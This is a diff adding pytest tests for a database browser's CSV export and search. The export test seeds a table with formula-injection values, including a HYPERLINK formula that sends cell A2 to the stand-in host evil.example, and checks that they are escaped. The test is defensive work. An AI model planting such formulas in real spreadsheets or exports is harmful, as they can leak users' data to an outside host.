@@ -523,3 +523,46 @@ def test_connecting_records_when_a_connection_was_last_opened(client, conn_id):
     assert saved[conn_id]['last_used'] > 0
     assert client.put(f'/api/connections/{conn_id}', json={'name': 'renamed', 'type': 'sqlite', 'database': saved[conn_id]['database'], 'environment': ''}).status_code == 200
     assert client.get('/api/connections').get_json()['connections'][0]['last_used'] == saved[conn_id]['last_used']   # an edit keeps it
+
+
+# --- spreadsheet-safe CSV and literal search --------------------------------------------------------------------------
+
+def test_csv_export_protects_text_a_spreadsheet_would_run_as_a_formula(client, conn_id, sqlite_path):
+    import sqlite3
+    s = sqlite3.connect(sqlite_path)
+    s.executemany('insert into t(id, name, v) values (?, ?, ?)', [
+        (10, '=HYPERLINK("http://evil.example/?"&A2,"x")', -5), (11, '+1+1', 2), (12, '@SUM(A1)', 3), (13, '-2+3', 4),
+        (14, '-5', 5), (15, '=', 6), (16, 'plain', 7)])
+    s.commit()
+    s.close()
+
+    def names_in(raw=False):
+        r = client.get('/api/export', query_string=dict(connection_id=conn_id, database=sqlite_path, table='t', format='csv', **({'raw': '1'} if raw else {})))
+        import csv, io
+        return {row[0]: row[1] for row in csv.reader(io.StringIO(r.get_data(as_text=True))) if row[0].isdigit()}, r.get_data(as_text=True)
+
+    safe, text = names_in()
+    assert safe['10'].startswith("'=HYPERLINK") and safe['11'] == "'+1+1" and safe['12'] == "'@SUM(A1)" and safe['13'] == "'-2+3" and safe['15'] == "'="
+    assert safe['14'] == '-5' and safe['16'] == 'plain'            # a number written as text, and ordinary text, are untouched
+    assert ',-5.0,' in text or ',-5,' in text                       # a real negative number is untouched
+    raw, _ = names_in(raw=True)
+    assert raw['10'].startswith('=HYPERLINK') and raw['13'] == '-2+3'
+    j = client.get('/api/export', query_string=dict(connection_id=conn_id, database=sqlite_path, table='t', format='json')).get_data(as_text=True)
+    assert '"=HYPERLINK' in j                                       # JSON is exact
+
+
+def test_search_treats_percent_and_underscore_as_ordinary_characters(client, conn_id, sqlite_path):
+    import sqlite3
+    s = sqlite3.connect(sqlite_path)
+    s.executemany('insert into t(id, name, v) values (?, ?, ?)', [(20, 'a_b', 1), (21, 'axb', 1), (22, '50%', 1), (23, '500', 1), (24, 'back\\slash', 1), (25, 'bacXslash', 1)])
+    s.commit()
+    s.close()
+
+    def found(term):
+        r = get_data(client, conn_id, sqlite_path, search=term).get_json()['data']['rows']
+        return sorted(x['name'] for x in r)
+    assert found('a_b') == ['a_b']                      # not also axb
+    assert found('50%') == ['50%']                      # not also 500
+    assert found('%') == ['50%']                        # a lone % is a percent sign, not "everything"
+    assert found('back\\s') == ['back\\slash']          # the escape character itself is literal too
+    assert 'alpha' in found('ALPHA')                    # still not case sensitive
